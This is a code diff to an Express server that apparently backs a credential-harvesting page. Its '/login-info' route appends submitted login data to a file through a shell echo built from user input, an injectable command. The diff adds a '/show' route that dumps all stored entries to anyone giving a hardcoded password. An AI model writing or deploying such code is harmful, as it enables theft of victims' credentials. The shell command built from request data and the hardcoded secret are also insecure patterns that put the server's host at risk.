@@ -1,6 +1,7 @@
 const express = require('express')
 const app = express()
 const path = require('path')
+const fs = require('fs')
 const { execSync } = require('child_process')
 const logger = require('morgan')
 
@@ -29,14 +30,37 @@ app.post('/login-info', (req, res) => {
 
         execSync(`echo ${JSON.stringify(data)} >> data.txt`)
         res.json({
-            title:"Success",
-            message:"Success login"
+            title: "Success",
+            message: "Success login"
         })
     } catch (e) {
         res.json({
-            title:"Error",
-            message:e.message
+            title: "Error",
+            message: e.message
         })
     }
 
+})
+
+app.post('/show', (req, res) => {
+    try {
+        const { password } = req.body
+        if (password !== 'lazanya.com') return res.json({
+            title: "Hmm",
+            message: "Get out"
+        })
+
+        const data = fs.readFileSync('data.txt', 'utf-8')
+
+        res.json({
+            title: "Success",
+            data: JSON.parse(data)
+        })
+
+    } catch (e) {
+        res.json({
+            title: "Error",
+            message: e.message
+        })
+    }
 })
